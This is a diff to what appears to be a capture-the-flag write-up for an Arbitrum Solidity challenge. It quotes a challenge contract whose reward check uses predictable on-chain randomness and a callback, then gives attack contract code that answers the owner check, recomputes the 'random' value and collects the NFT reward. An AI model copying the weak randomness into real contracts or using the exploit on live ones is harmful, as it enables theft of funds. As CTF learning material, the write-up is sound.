@@ -110,3 +110,73 @@ $ cast keccak "returnTrue()"
 - We know that our variable is going to be stored in storage location 777. 
 - We can use `cast`:
 `cast storage 0x89edc4c74810bedbd53d7dA677eB420DC0154B0b 777 --rpc-url $ARBITRUM_RPC_URL`
+
+### [Challenge 4](https://arbiscan.io/address/0xef72ba6575b86beaa9b9e4a78bca4a58f3cce276)
+```
+/*
+ * CALL THIS FUNCTION!
+ * 
+ * @param guess - your guess to solve the challenge. 
+ * @param yourTwitterHandle - Your twitter handle. Can be a blank string.
+ */
+function solveChallenge(uint256 guess, string memory yourTwitterHandle) external {
+	(bool success, bytes memory returnData) = msg.sender.staticcall(abi.encodeWithSignature("owner()"));
+	address ownerAddress;
+	assembly {
+		ownerAddress := mload(add(returnData, 32))
+	}
+	if (!success || ownerAddress != msg.sender) {
+		revert S4__BadOwner();
+	}
+	if (myVal == 1) {
+		// slither-disable-next-line weak-prng
+		uint256 rng =
+			uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp))) % 1_000_000;
+		if (rng != guess) {
+			revert S4__BadGuess();
+		}
+		_updateAndRewardSolver(yourTwitterHandle);
+	} else {
+		myVal = 1;
+		(bool succ,) = msg.sender.call(abi.encodeWithSignature("go()"));
+		if (!succ) {
+			revert S4__BadReturn();
+		}
+	}
+	myVal = 0;
+}
+```
+- We need to create an attack contract to take advantage of the weak randomness implemented by the challenge
+- Our attack contract should have a function called `owner()` and a function called `go()`
+
+ `owner()` needs to return the address of the attack contract
+```js
+function owner() external view returns (address) {
+	return address(this);
+}
+```
+
+ `go()` should handle the `rng` calculation and call the `solveChallenge` function
+```js
+function go() external {
+	string memory handle = "";
+	uint256 rng = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
+	challengeContract.solveChallenge(rng, handle);
+}
+```
+
+Our contract should be able to receive NFTs
+```js
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+
+contract S4Attack is IERC721Receiver {
+	...
+	
+	function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
+		return this.onERC721Received.selector;
+	}
+
+    ...
+}
+```
